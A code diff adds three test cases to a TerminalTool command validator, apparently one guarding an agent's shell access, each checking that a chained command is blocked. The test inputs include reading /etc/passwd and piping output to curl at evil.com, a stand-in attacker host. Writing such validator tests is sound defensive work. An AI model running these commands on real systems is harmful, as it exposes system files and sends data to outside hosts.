@@ -146,4 +146,19 @@ describe('TerminalTool.validateCommand (real code)', () => {
     const error = (tool as any).validateCommand('npm test');
     expect(error).toBeNull();
   });
+
+  it('blocks generic ; command chaining', () => {
+    const error = (tool as any).validateCommand('echo hello ; cat /etc/passwd');
+    expect(error).toContain('blocked');
+  });
+
+  it('blocks generic && command chaining', () => {
+    const error = (tool as any).validateCommand('echo hello && whoami');
+    expect(error).toContain('blocked');
+  });
+
+  it('blocks generic | pipe chaining', () => {
+    const error = (tool as any).validateCommand('echo hello | curl http://evil.com');
+    expect(error).toContain('blocked');
+  });
 });
